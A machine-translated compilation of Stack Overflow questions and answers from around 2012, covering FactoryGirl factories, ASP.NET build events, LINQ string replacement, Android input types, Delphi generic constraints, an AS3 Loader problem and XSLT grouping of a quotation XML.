factory :custom_user, class: CustomUser, parent: :user do
  customfield "customfield"
end 
```

欲了解更多信息：[继承](https://github.com/thoughtbot/factory_girl/blob/master/GETTING_STARTED.md#inheritance)。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2014-05-23T12:17:33.323

只需将类：CustomUser 添加到 :custom_user 工厂。这对我行得通。当您嵌套在 :user 中时，这意味着父级是用户，但它更简单。

```
FactoryGirl.define do 
  factory :user do
    name  "name"
    bla "bla"

    factory :custom_user, class: CustomUser do
      customfield "customfield"
    end
  end
end 
```

# asp.net - 在构建时执行内部代码

> ID：13343879
> 
> 赞同：0
> 
> 时间：2012-11-12T12:40:30.723
> 
> 标签：asp.net, visual-studio, build

### 背景

在一个 ASP.NET 站点中，我使用了一个名为[Nocco](https://github.com/dontangg/nocco)的代码文档工具。Nocco 是一个命令行工具，您可以在特定代码文件上显式运行它以输出该代码的 HTML 呈现版本及其文档。我目前在我的`Global_asax.Application_Start`方法中设置了一些代码来爬取几个目录并处理每个目录中的所有代码文件。

### 问题

最终，将其放入`Global_asax.Applicaton_Start`意味着它正在构建 Nocco 文档，每个文件在每个会话开始时大约需要 1 秒 - 而不是每个部署一次。这似乎效率低下，并且在页面加载时最终浪费了用户的时间。

### 问题

是否可以将 ASP.NET 应用程序内部的代码（例如类方法）作为构建后事件执行？我知道我可以将我的这部分设置转换为独立的应用程序甚至批处理脚本，但我在其他情况下也有这个问题，并且想知道这是否可能。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T14:50:30.493

您可以在预热脚本中生成，这是 IIS 7.5 的链接

[http://blogs.iis.net/thomad/archive/2009/10/14/now-available-the-iis-7-5-application-warm-up-module.aspx](http://blogs.iis.net/thomad/archive/2009/10/14/now-available-the-iis-7-5-application-warm-up-module.aspx)

或者您可以在单独的程序集中排除代码文档功能并将其包含在独立应用程序中，并将其作为项目构建事件中的外部命令调用

# c# - 如何使用 LINQ 替换字符串中的字符

> ID：13343885
> 
> 赞同：3
> 
> 时间：2012-11-12T12:40:42.017
> 
> 标签：c#, .net, string, linq

例如：- 将 2 替换为 0 用于以下输入输入：string strInput = "21212121"; 输出：“01010101”

如何用 LINQ 做到这一点。注意： dataType 是**string**。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-12T12:41:57.933

为什么你需要用 LINQ 来做，简单的 string.Replace 应该可以解决问题。

```
string str = "21212121".Replace("2","0"); 
```

编辑：如果你必须使用 LINQ，那么可能是这样的：

```
string  newStr = new string(str.Select(r => (r == '2' ? '0' : r)).ToArray()); 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-11-12T12:46:07.870

给你的面试官

```
string output = new String(input.Select(ch => ch == '2' ? '0' : ch).ToArray()); 
```

我认为打算看看你是否理解字符串可以被视为字符序列。面试经常有与现实生活中的编程无关的问题。我个人讨厌关于带有`new`修饰符的继承树的问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-12T12:43:41.703

要更改*单个*字符，您可以使用[带](http://msdn.microsoft.com/en-us/library/czx8s9ts.aspx)[参数的](http://msdn.microsoft.com/en-us/library/czx8s9ts.aspx)[重载`Replace``char`](http://msdn.microsoft.com/en-us/library/czx8s9ts.aspx)：

```
string s = "21212121";
s = s.Replace('2', '0'); 
```

这可能比接受字符串的重载稍微高效一些。

* * *

如果出于某种原因您绝对*必须使用 LINQ，那么您可以这样做：*

```
s = new string(s.Select(c => c == '2' ? '0' : c).ToArray()); 
```

但是你不应该在生产代码中这样做。它比`string.Replace`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-12T12:45:58.973

```
string strInput = "21212121";

char from = '2';
char to = '0';

var strOutput = new string(strInput.Select(c => c.Equals(from) ? to : c)
                                   .ToArray());

Console.WriteLine(strOutput); 
```

# android - Android 3.2 InputType 数字预选

> ID：13343887
> 
> 赞同：2
> 
> 时间：2012-11-12T12:41:03.887
> 
> 标签：android, text, numbers, android-edittext

我的 Android 应用程序中有一个 EditText-Object，用户可以在其中输入“街道号码”。因为门牌号也可能由字符组成，所以字符输入根本不应该被禁用，而是应该**预先选择**数字输入，如果用户愿意，他也可以**切换到字符输入**。直到现在我找不到任何使用的标志组合

```
editText.setInputType(...); 
```

EditText 中可能允许的条目是： **23a-26b**

这总是不允许其他输入类型，但我想要的只是预选的输入类型。

有任何想法吗？

# asp.net-mvc - 无法将匿名类型转换为 int - 编译的 linq 到 sql 查询

> ID：13343888
> 
> 赞同：0
> 
> 时间：2012-11-12T12:41:06.677
> 
> 标签：asp.net-mvc, linq-to-sql

我正在尝试进行编译查询，但我只想让它返回一个 int

```
 public Func<DataContext, DateTime, int>
    GetNextTourNo = CompiledQuery.Compile((DataContext db, DateTime day) => ((from b in db.GetTable<BookingType>()
                                                                              where b.RecordType == "H" && b.TourStartDateTime.Value.Date == day.Date
                                                                              orderby b.TourID descending
                                                                              select new { nextID = b.TourID +1 }).Single())); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:47:16.760

你能提供更多关于匿名类型和编译查询上下文的信息吗？

此外，如果您直接在 linq to Entity 中使用查询，则日期比较将不起作用。为此需要使用实体函数。这可能会导致无效退货。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T13:01:04.223

您可以只`nextID`从选定的单个匿名对象返回属性

```
select new { nextID = b.TourID +1 }).Single().nextID 
```

# delphi - Delphi中构造函数约束的用例是什么？

> ID：13343890
> 
> 赞同：4
> 
> 时间：2012-11-12T12:41:20.047
> 
> 标签：delphi, generics, parameterized-types

标题差不多就是...

为什么要使用`constructor`约束？

`class`约束 清楚地暗示了这一点。

如果您单独使用它，您将无法对您创建的东西做任何事情。

为什么它甚至存在？

**附加信息：**

请注意，在添加“构造函数”约束之前，以下代码不会编译：

```
program Project3;

{$APPTYPE CONSOLE}

{$R *.res}

uses
  System.SysUtils;

type
  TSomeClass<T: class> = class
    function GetType: T;
  end;

{ TSomeClass<T> }

function TSomeClass<T>.GetType: T;
begin
  Result := T.Create;
end;

begin
  try
    { TODO -oUser -cConsole Main : Insert code here }
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end. 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-12T12:44:11.147

> 为什么要使用构造函数约束？
> 
> 类约束清楚地暗示了这一点。

不，这不对。构造函数约束要求该类型有一个公共的、无参数的构造函数——然后允许调用该构造函数。

并非所有类都有公共无参数构造函数。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-12T17:29:20.270

恕我直言，该约束的官方原因是编译器实际上无法自己处理它。

它只是编译器的一个标志，也可以自己设置，因为编译器确实认识到我们需要构造函数约束这一事实。所以它可以由编译器自动处理，因为 Generic 类将在使用该类之前进行编译。

也许我们会用 XE9 得到它

更新

如果 TComponent 被接受为没有公共无参数构造函数的类类型，则构造函数约束是无用的，因为 this（来自 Nick 的扩展示例）编译并生成 TComponent 实例。当然它不会调用原来的构造函数 TComponent.Create( AOwner : TComponent )，而是调用了 TObject.Create，但是你有一个 TComponent Instance。

```
program Project3;

{$APPTYPE CONSOLE}

{$R *.res}

uses
  System.SysUtils, System.Classes;

type
  TSomeClass<T: class, constructor> = class
    function GetType: T;
  end;

{ TSomeClass<T> }

function TSomeClass<T>.GetType: T;
begin
  Result := T.Create;
end;

var
  SomeClass : TSomeClass<TComponent>;
  Component : TComponent;
begin
  try
    SomeClass := TSomeClass<TComponent>.Create;
    Component := SomeClass.GetType;
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end. 
```

更新

```
TSomeClass<T: class, constructor> 
```

具有相同的含义

```
TSomeClass<T: constructor> 
```

因为记录可以有构造函数，但不能有无参数，所以我们对类有一个隐式约束。扭转局面

```
TSomeClass<T: class> 
```

可能有一个隐式的构造函数约束

# actionscript-3 - 游戏重置后 AS3 加载器无法卸载

> ID：13343896
> 
> 赞同：1
> 
> 时间：2012-11-12T12:41:53.173
> 
> 标签：actionscript-3, reset, loader, flixel

在过去的几年里，你一直对我有很大的帮助。我总能找到解决我的编程问题的方法。但是，这一次我找不到解决方案。尽管有一些讨论加载器的主题。我的很不一样。

问题：在第一个游戏屏幕中，我加载了一个电影（转换为 .swf 的电影）。在我切换到下一个状态后，它会卸载并且不再显示。在游戏结束时，我执行了我自己制作的重置函数（这与加载程序没有太大关系，它只是重置一些静态变量）并且游戏切换到第一个状态。

装载机再次出现。但是现在当我切换状态时，Loader 仍在显示。

注意：我正在使用 flixel 库。虽然我不认为在这种情况下它有很大的不同（虽然我认为它可能会因为我仍然有问题：P）。

我只放了重要的代码。我有三个按钮。假设我推。第三个按钮。在 switch 案例中，我输入案例 2。

重置函数是一个 flixel 函数： FlxG.resetGame() 但我认为这并不重要。

我希望这是足以让某人看到问题/解决方案的信息。提前致谢。

这是代码：

```
AMCInlog.as

private var my_loader:Loader;
private var my_player:Object;
    public function AMCInlog() 
    {
        imgBackground = new FlxSprite(0, 0, Resources.imgStartMenuBackground);
        add(imgBackground);

        my_loader = new Loader();
        my_loader.x = 40;
        my_loader.y = 156;          
        my_loader.scaleX = 1.2;
        my_loader.scaleY = 1.2;
        //loadUserData();
        moviePlayerSequence();
        //userData.clear();
        //createButtons();  
    }

    private function moviePlayerSequence():void {
        var request:URLRequest = new URLRequest("DGAME Movie.swf");
        my_loader.load(request);
        FlxG.stage.addChild(my_loader);
    }

    private function currentButtonFunction():void {
        switch(currentButton) {
            case 0:
                my_loader.unloadAndStop();
                FlxG.stage.removeChild(my_loader);
                FlxG.switchState(new AMCRegister());
                break;
            case 1:
                my_loader.unloadAndStop();
                FlxG.stage.removeChild(my_loader);
                FlxG.switchState(new AMCExistingAccountLogin());
                break;
            case 2:
                my_loader.unloadAndStop();
                FlxG.stage.removeChild(my_loader);
                FlxG.switchState(new AMCPreferences());
                break;
            default:
                break;
        }
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T10:43:00.137

你永远不会重置你的加载器，因此它只会保留上次加载的内容，要么简单地尝试重置（或实际重新启动）你的加载器（不是最好的方法（将进入从未有过的闪存垃圾收集）太棒了）但是嘿，它有效）

```
my_loader = new Loader(); 
```

或者（因为我没有看到）尝试简单地使用 unload(); 而不是 unloadAndStop(); （因为好吧，你不需要停止它，如果你正确卸载它，它无论如何都消失了）

祝你好运！

# android - 如果我使用 android 4.1.2 (API 16) Android SDK 我的应用程序可以在 Android 2.3 上运行吗

> ID：13343899
> 
> 赞同：0
> 
> 时间：2012-11-12T12:41:57.480
> 
> 标签：android, sdk

如果我使用 android 4.1.2 (API 16) Android SDK 我的应用程序可以在 Android 2.3 手机上运行。我已经下载了 android 4.1.2 sdk 工具和其他软件包。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T12:46:58.320

您需要将清单中的最低 SDK 属性设置为 2.3，以确保您的应用可以在早期版本的操作系统上运行。

假设您没有使用来自更高版本的任何 API 调用，您的应用程序将正常工作。

Android 开发团队建议您始终针对您可以支持的最新版本进行编译。所以，你在正确的轨道上。

所以最重要的是，您走在正确的轨道上，只需确保针对 2.3.3 版本的模拟器测试您的应用程序，以确保您没有使用任何不受支持的 API 调用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-08T18:02:50.763

不，如果您的最低 sdk 版本是 16，它将无法在该 android 版本上运行。如果您希望它在该特定版本上运行，请将最低 sdk 版本设置为 9。您可以在应用程序清单文件中更改此设置。

```
<uses-sdk
android:minSdkVersion="9"
android:targetSdkVersion="21"
/> 
```

如果您收到错误，可能会说“此代码使用最低 sdk 为 api 16 或更高版本”，请找到其他方法来修改旧 Android 手机的代码。如果这不起作用，那么可能不支持旧版本的android。

# xslt - 基于元素的xslt分组

> ID：13343905
> 
> 赞同：0
> 
> 时间：2012-11-12T12:42:22.170
> 
> 标签：xslt, grouping, xslt-1.0

我有一个关于在 xml 中分组的问题。

1.  第一个问题是xml没有分组行的结构，顺序没问题。
2.  第二个问题是如果用于分组的元素与前一个相同，则它们不会重复。

分组必须在 BodyCustQuotationTrans -detaillines 上，第一级是 UnitID，第二级是 objectgroupID。

非常感谢有人可以提供帮助！

输入xml：

```
 <?xml version="1.0" encoding="UTF-8"?>
<Report Name="SalesQuotation" Caption="Offerte" Language="EN">
  <Quotation>
    <CustQuotationJour_DeliveryName>Testcustomer</CustQuotationJour_DeliveryName>
    <CustQuotationJour_DeliveryAddress>101 street 3293 CITY</CustQuotationJour_DeliveryAddress>
    <QuotationTxt>Quotation</QuotationTxt>
  </Quotation>
  <Lines>
    <BodyCustQuotationTrans>
      <ItemId>1006055</ItemId>
      <CustQuotationTrans_Name>Laufen Pro kunststof bad 180x80cm WIT ZO</CustQuotationTrans_Name>
      <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
      <salesUnitTxt>ST</salesUnitTxt>
      <CustQuotationTrans_SalesPrice>511,00</CustQuotationTrans_SalesPrice>
      <UnitID>Bathroom</UnitID>
      <UnitNumber>1,00</UnitNumber>
      <ObjectgroupID>Bath</ObjectgroupID>
    </BodyCustQuotationTrans>
    <BodyCustQuotationTrans>
      <ItemId>1036625</ItemId>
      <CustQuotationTrans_Name>Set Laufen badpoten (instelbaar) voor Pr</CustQuotationTrans_Name>
      <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
      <salesUnitTxt>ST</salesUnitTxt>
      <CustQuotationTrans_SalesPrice>38,00</CustQuotationTrans_SalesPrice>
      <UnitID>
      </UnitID>
      <UnitNumber>
      </UnitNumber>
      <ObjectgroupID>
      </ObjectgroupID>
    </BodyCustQuotationTrans>
    <BodyCustQuotationTrans>
      <ItemId>1038952</ItemId>
      <CustQuotationTrans_Name>Chroom badafvoer-overloopkomb.1 ½ met wa</CustQuotationTrans_Name>
      <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
      <salesUnitTxt>ST</salesUnitTxt>
      <CustQuotationTrans_SalesPrice>56,90</CustQuotationTrans_SalesPrice>
      <UnitID>
      </UnitID>
      <UnitNumber>
      </UnitNumber>
      <ObjectgroupID>
      </ObjectgroupID>
    </BodyCustQuotationTrans>
    <BodyCustQuotationTrans>
      <ItemId>1007857</ItemId>
      <CustQuotationTrans_Name>Grohtherm 2000 badthermostaat 15cm chr z</CustQuotationTrans_Name>
      <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
      <salesUnitTxt>ST</salesUnitTxt>
      <CustQuotationTrans_SalesPrice>353,65</CustQuotationTrans_SalesPrice>
      <UnitID>
      </UnitID>
      <UnitNumber>
      </UnitNumber>
      <ObjectgroupID>
      </ObjectgroupID>
    </BodyCustQuotationTrans>
    <BodyCustQuotationTrans>
      <ItemId>2061780</ItemId>
      <CustQuotationTrans_Name>Easy Drain COMPACT 50 1000mm met rooster</CustQuotationTrans_Name>
      <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
      <salesUnitTxt>ST</salesUnitTxt>
      <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
      <UnitID>
      </UnitID>
      <UnitNumber>1,00</UnitNumber>
      <ObjectgroupID>Shower</ObjectgroupID>
    </BodyCustQuotationTrans>
    <BodyCustQuotationTrans>
      <ItemId>2062352</ItemId>
      <CustQuotationTrans_Name>Easy 2 Seal afdichtingspasta voor o.a. E</CustQuotationTrans_Name>
      <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
      <salesUnitTxt>ST</salesUnitTxt>
      <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
      <UnitID>
      </UnitID>
      <UnitNumber>
      </UnitNumber>
      <ObjectgroupID>
      </ObjectgroupID>
    </BodyCustQuotationTrans>
    <BodyCustQuotationTrans>
      <ItemId>1007831</ItemId>
      <CustQuotationTrans_Name>Grohtherm 2000 douchethermostaat 15cm ch</CustQuotationTrans_Name>
      <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
      <salesUnitTxt>ST</salesUnitTxt>
      <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
      <UnitID>
      </UnitID>
      <UnitNumber>
      </UnitNumber>
      <ObjectgroupID>
      </ObjectgroupID>
    </BodyCustQuotationTrans>
    <BodyCustQuotationTrans>
      <ItemId>4044377</ItemId>
      <CustQuotationTrans_Name>Vasco Arabis Bathroomradiator typ HDRM33</CustQuotationTrans_Name>
      <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
      <salesUnitTxt>ST</salesUnitTxt>
      <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
      <UnitID>
      </UnitID>
      <UnitNumber>1,00</UnitNumber>
      <ObjectgroupID>Radiator</ObjectgroupID>
    </BodyCustQuotationTrans>
    <BodyCustQuotationTrans>
      <ItemId>4044689</ItemId>
      <CustQuotationTrans_Name>Vasco designventielset met thermost.knop</CustQuotationTrans_Name>
      <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
      <salesUnitTxt>ST</salesUnitTxt>
      <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
      <UnitID>
      </UnitID>
      <UnitNumber>
      </UnitNumber>
      <ObjectgroupID>
      </ObjectgroupID>
    </BodyCustQuotationTrans>
    <BodyCustQuotationTrans>
      <ItemId>1033033</ItemId>
      <CustQuotationTrans_Name>GEBERIT DUOFIX, DE ECHTE!!!</CustQuotationTrans_Name>
      <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
      <salesUnitTxt>ST</salesUnitTxt>
      <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
      <UnitID>Toiletruim</UnitID>
      <UnitNumber>1,00</UnitNumber>
      <ObjectgroupID>Closet</ObjectgroupID>
    </BodyCustQuotationTrans>
    <BodyCustQuotationTrans>
     <ItemId>1033358</ItemId>
      <CustQuotationTrans_Name>Geberit bedieningsplaat Samba frontbed.</CustQuotationTrans_Name>
      <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
      <salesUnitTxt>ST</salesUnitTxt>
      <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
      <UnitID>
      </UnitID>
      <UnitNumber>
      </UnitNumber>
      <ObjectgroupID>
      </ObjectgroupID>
    </BodyCustQuotationTrans>
    <BodyCustQuotationTrans>
      <ItemId>1027975</ItemId>
      <CustQuotationTrans_Name>Plaatstalen uitstortgootsteen 51x36 wit</CustQuotationTrans_Name>
      <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
      <salesUnitTxt>ST</salesUnitTxt>
      <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
      <UnitID>Kitchen</UnitID>
      <UnitNumber>1,00</UnitNumber>
      <ObjectgroupID>Sinc</ObjectgroupID>
    </BodyCustQuotationTrans>
    <BodyCustQuotationTrans>
      <ItemId>1027988</ItemId>
      <CustQuotationTrans_Name>Alape emmerrooster aluminium kleur voor</CustQuotationTrans_Name>
      <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
      <salesUnitTxt>ST</salesUnitTxt>
      <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
      <UnitID>
      </UnitID>
      <UnitNumber>
      </UnitNumber>
      <ObjectgroupID>
      </ObjectgroupID>
    </BodyCustQuotationTrans>
    <BodyCustQuotationTrans>
      <ItemId>1039264</ItemId>
      <CustQuotationTrans_Name>Syfon universeel 1 1/2"x 40 mm. Mc.alpin</CustQuotationTrans_Name>
      <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
      <salesUnitTxt>ST</salesUnitTxt>
      <CustQuotationTrans_SalesPrice>9,90</CustQuotationTrans_SalesPrice>
      <UnitID_LABEL>Unit ID</UnitID_LABEL>
      <UnitID>
      </UnitID>
      <UnitNumber>
      </UnitNumber>
      <ObjectgroupID>
      </ObjectgroupID>
    </BodyCustQuotationTrans>
  </Lines>
  <Totals>
    <CustQuotationJour_SalesBalance>5.082,19</CustQuotationJour_SalesBalance>
    <CustQuotationJour_EndDisc>0,00</CustQuotationJour_EndDisc>
    <CustQuotationJour_SumMarkup>0,00</CustQuotationJour_SumMarkup>
    <CustQuotationJour_SumTax>1.067,26</CustQuotationJour_SumTax>
    <CustQuotationJour_RoundOff>0,00</CustQuotationJour_RoundOff>
    <CustQuotationJour_QuotationAmount>6.149,45</CustQuotationJour_QuotationAmount>
    <CustQuotationJour_CurrencyCode>EUR</CustQuotationJour_CurrencyCode>
  </Totals>
</Report> 
```

结果必须如下：

```
 <?xml version="1.0" encoding="UTF-8"?>
<Report Name="SalesQuotation" Caption="Offerte" Language="NL">
      <Quotation>
        <CustQuotationJour_DeliveryName>Testcustomer</CustQuotationJour_DeliveryName>
        <CustQuotationJour_DeliveryAddress>101 street 3293 CITY</CustQuotationJour_DeliveryAddress>
        <QuotationTxt>Quotation</QuotationTxt>
      </Quotation>
      <Lines>
          <Unit>
                <UnitID>Bathroom</UnitID>
                <UnitNumber>1,00</UnitNumber>
                  <Objectgroup>
                    <ObjectgroupID>Bath</ObjectgroupID>
                      <BodyCustQuotationTrans>
                        <ItemId>1006055</ItemId>
                        <CustQuotationTrans_Name>Laufen Pro kunststof bad 180x80cm WIT ZO</CustQuotationTrans_Name>
                        <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
                        <salesUnitTxt>ST</salesUnitTxt>
                        <CustQuotationTrans_SalesPrice>511,00</CustQuotationTrans_SalesPrice>
                      </BodyCustQuotationTrans>
                      <BodyCustQuotationTrans>
                        <ItemId>1036625</ItemId>
                        <CustQuotationTrans_Name>Set Laufen badpoten (instelbaar) voor Pr</CustQuotationTrans_Name>
                        <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
                        <salesUnitTxt>ST</salesUnitTxt>
                        <CustQuotationTrans_SalesPrice>38,00</CustQuotationTrans_SalesPrice>
                      </BodyCustQuotationTrans>
                      <BodyCustQuotationTrans>
                        <ItemId>1038952</ItemId>
                        <CustQuotationTrans_Name>Chroom badafvoer-overloopkomb.1 ½ met wa</CustQuotationTrans_Name>
                        <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
                        <salesUnitTxt>ST</salesUnitTxt>
                        <CustQuotationTrans_SalesPrice>56,90</CustQuotationTrans_SalesPrice>
                      </BodyCustQuotationTrans>
                      <BodyCustQuotationTrans>
                        <ItemId>1007857</ItemId>
                        <CustQuotationTrans_Name>Grohtherm 2000 badthermostaat 15cm chr z</CustQuotationTrans_Name>
                        <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
                        <salesUnitTxt>ST</salesUnitTxt>
                        <CustQuotationTrans_SalesPrice>353,65</CustQuotationTrans_SalesPrice>
                        <UnitID_LABEL>Unit ID</UnitID_LABEL>
                      </BodyCustQuotationTrans>
                    <Subtotalgroup>959,55</Subtotalgroup>
                  </Objectgroup>
                  <Objectgroup>
                    <ObjectgroupID>Shower</ObjectgroupID>
                      <BodyCustQuotationTrans>
                        <ItemId>2061780</ItemId>
                        <CustQuotationTrans_Name>Easy Drain COMPACT 50 1000mm met rooster</CustQuotationTrans_Name>
                        <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
                        <salesUnitTxt>ST</salesUnitTxt>
                        <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
                      </BodyCustQuotationTrans>
                      <BodyCustQuotationTrans>
                        <ItemId>2062352</ItemId>
                        <CustQuotationTrans_Name>Easy 2 Seal afdichtingspasta voor o.a. E</CustQuotationTrans_Name>
                        <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
                        <salesUnitTxt>ST</salesUnitTxt>
                        <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
                      </BodyCustQuotationTrans>
                      <BodyCustQuotationTrans>
                        <ItemId>1007831</ItemId>
                        <CustQuotationTrans_Name>Grohtherm 2000 douchethermostaat 15cm ch</CustQuotationTrans_Name>
                        <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
                        <salesUnitTxt>ST</salesUnitTxt>
                        <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
                      </BodyCustQuotationTrans>
                    <Subtotalgroup>60</Subtotalgroup>
                  </Objectgroup>
                  <Objectgroup>
                    <ObjectgroupID>Radiator</ObjectgroupID>
                      <BodyCustQuotationTrans>
                        <ItemId>4044377</ItemId>
                        <CustQuotationTrans_Name>Vasco Arabis Bathroomradiator typ HDRM33</CustQuotationTrans_Name>
                        <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
                        <salesUnitTxt>ST</salesUnitTxt>
                        <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
                      </BodyCustQuotationTrans>
                      <BodyCustQuotationTrans>
                        <ItemId>4044689</ItemId>
                        <CustQuotationTrans_Name>Vasco designventielset met thermost.knop</CustQuotationTrans_Name>
                        <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
                        <salesUnitTxt>ST</salesUnitTxt>
                        <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
                      </BodyCustQuotationTrans>
                    <Subtotalgroup>40</Subtotalgroup>
                  </Objectgroup>
                <Subtotalunit>1059,55</Subtotalunit>
          </Unit>
          <Unit>
            <UnitID>Toilet</UnitID>
            <UnitNumber>1,00</UnitNumber>
                   <objectgroup>
                       <ObjectgroupID>Closet</ObjectgroupID>
                        <BodyCustQuotationTrans>
                          <ItemId>1033033</ItemId>
                          <CustQuotationTrans_Name>GEBERIT DUOFIX, DE ECHTE!!!</CustQuotationTrans_Name>
                          <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
                          <salesUnitTxt>ST</salesUnitTxt>
                          <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
                      </BodyCustQuotationTrans>
                      <BodyCustQuotationTrans>
                        <ItemId>1033358</ItemId>
                        <CustQuotationTrans_Name>Geberit bedieningsplaat Samba frontbed.</CustQuotationTrans_Name>
                        <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
                        <salesUnitTxt>ST</salesUnitTxt>
                        <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
                      </BodyCustQuotationTrans>
                    <Subtotalgroup>40</Subtotalgroup>
                 </objectgroup>
                <Subtotalunit>40</Subtotalunit>
          </Unit>
          <Unit>
            <UnitID>Kitchen</UnitID>
            <UnitNumber>1,00</UnitNumber>
              <objectgroup>
                <ObjectgroupID>Sinc</ObjectgroupID>
                      <BodyCustQuotationTrans>
                        <ItemId>1027975</ItemId>
                        <CustQuotationTrans_Name>Plaatstalen uitstortgootsteen 51x36 wit</CustQuotationTrans_Name>
                        <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
                        <salesUnitTxt>ST</salesUnitTxt>
                        <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
                      </BodyCustQuotationTrans>
                      <BodyCustQuotationTrans>
                        <ItemId>1027988</ItemId>
                        <CustQuotationTrans_Name>Alape emmerrooster aluminium kleur voor</CustQuotationTrans_Name>
                        <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
                        <salesUnitTxt>ST</salesUnitTxt>
                        <CustQuotationTrans_SalesPrice>20,00</CustQuotationTrans_SalesPrice>
                      </BodyCustQuotationTrans>
                      <BodyCustQuotationTrans>
                        <ItemId>1039264</ItemId>
                        <CustQuotationTrans_Name>Syfon universeel 1 1/2"x 40 mm. Mc.alpin</CustQuotationTrans_Name>
                        <CustQuotationTrans_Qty>1,00</CustQuotationTrans_Qty>
                        <salesUnitTxt>ST</salesUnitTxt>
                        <CustQuotationTrans_SalesPrice>9,90</CustQuotationTrans_SalesPrice>
                      </BodyCustQuotationTrans>
                <Subtotalgroup>49,90</Subtotalgroup>
              </objectgroup>
            <Subtotalunit>49,90</Subtotalunit>
          </Unit>
  </Lines>
  <Totals>
    <CustQuotationJour_SalesBalance>5.082,19</CustQuotationJour_SalesBalance>
    <CustQuotationJour_EndDisc>0,00</CustQuotationJour_EndDisc>
    <CustQuotationJour_SumMarkup>0,00</CustQuotationJour_SumMarkup>
    <CustQuotationJour_SumTax>1.067,26</CustQuotationJour_SumTax>
    <CustQuotationJour_RoundOff>0,00</CustQuotationJour_RoundOff>
    <CustQuotationJour_QuotationAmount>6.149,45</CustQuotationJour_QuotationAmount>
    <CustQuotationJour_CurrencyCode>EUR</CustQuotationJour_CurrencyCode>
  </Totals>
</Report> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T13:21:10.427

看起来您正在按“顺序”元素进行分组，因此组中的元素立即跟随它们分组的元素。**在您的情况下，您按UnitID**对元素进行分组，然后按 ObjectgroupID 在**其中**分组。因此，您将需要定义两个键

 **```
<xsl:key 
  name="Unit" 
  match="BodyCustQuotationTrans[UnitID = '']" 
  use="generate-id(preceding-sibling::BodyCustQuotationTrans[UnitID != ''][1])" />
<xsl:key 
  name="Objectgroup" 
  match="BodyCustQuotationTrans[ObjectgroupID = '']" 
  use="generate-id(preceding-sibling::BodyCustQuotationTrans[ObjectgroupID != ''][1])" /> 
```

**第一个键按具有UnitID**集的最前面的第一个元素对元素进行分组。第二个按具有**Objectgroup**集的第一个最前面的元素对元素进行分组。

首先，你会得到设置了**UnitID**的元素，像这样（这里使用的模式是因为会有多个模板匹配**BodyCustQuotationTrans**

```
<xsl:apply-templates select="BodyCustQuotationTrans[UnitID != '']" mode="Unit" /> 
```

在此模板中，您需要获取子组，在这种情况下，这将是 Unit 组中设置了**ObjectgroupID的元素**

```
<xsl:apply-templates select="self::*|key('Unit', generate-id())[ObjectgroupID != '']" mode="Objectgroup" /> 
```

